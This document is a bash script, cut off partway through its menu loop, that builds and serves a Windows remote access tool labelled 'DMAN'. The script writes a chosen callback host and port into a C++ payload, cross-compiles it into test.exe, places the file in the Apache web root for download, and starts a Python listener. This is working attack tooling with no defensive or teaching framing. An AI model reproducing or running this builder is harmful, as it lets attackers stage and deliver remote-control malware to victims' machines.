#!/bin/bash

# Function to display the banner
display_banner() {
  echo -e "\e[92m#################################################\e[0m"
  echo -e "\e[92m#                                               #\e[0m"
  echo -e "\e[92m#                \e[91mDMAN\e[92m           #\e[0m"
  echo -e "\e[92m#                                               #\e[0m"
  echo -e "\e[92m#################################################\e[0m"
  echo -e "\e[93m"
}

# Default values
LHOST="127.0.0.1"
LPORT="9999"

# Function to show options
show_options() {
  echo -e "\e[93mConfiguration Options:\e[0m"
  echo "LHOST: $LHOST"
  echo "LPORT: $LPORT"
  echo -e "\e[93mTo change LHOST, type: set LHOST=<IP_ADDRESS>\e[0m"
  echo -e "\e[93mTo change LPORT, type: set LPORT=<PORT_NUMBER>\e[0m"
  echo -e "\e[93mTo deploy, type: deploy\e[0m"
}

# Function to compile and set up remote access tool
deploy_tool() {
  if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
      echo "Compiler not installed. Installing now..."
      sudo apt-get install -y mingw-w64
  fi

  echo "Updating C++ code with the provided LHOST and LPORT..."
  sed -i "s/REPLACE_WITH_LHOST/$LHOST/" program.cpp
  sed -i "s/REPLACE_WITH_LPORT/$LPORT/" program.cpp

  echo "Compiling the C++ code..."
  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ program.cpp -o test.exe -lws2_32

  echo "Compilation completed. The executable is test.exe"

  echo "Moving the executable to the Apache server directory..."
  sudo mv test.exe /var/www/html/

  echo "Starting Apache server..."
  sudo systemctl start apache2

  echo "The tool is available at: http://$LHOST/test.exe"
}

# Function to start the server
start_server() {
  echo "Running the server..."
  python3 server.py
}

# Ensure the system is updated and install necessary packages
echo "Updating system and installing necessary packages..."
sudo apt-get update
sudo apt-get install -y python3 apache2 git

# Display the banner
display_banner

while true; do
  echo -e "\e[92m1. Show options\e[0m"
  echo -e "\e[92m2. Start server\e[0m"
  echo -e "\e[92m3. Exit\e[0m"
  echo -e "\e[93mSelect an option:\e[0m"
  read OPTION

  case $OPTION in
    1)
      show_options
      while true; do
        read INPUT
        if [[ $INPUT == "deploy" ]]; then
          deploy_tool
          break
        elif [[ $INPUT == set\ LHOST=* ]]; then
          LHOST=${INPUT#*=}
          echo "LHOST set to
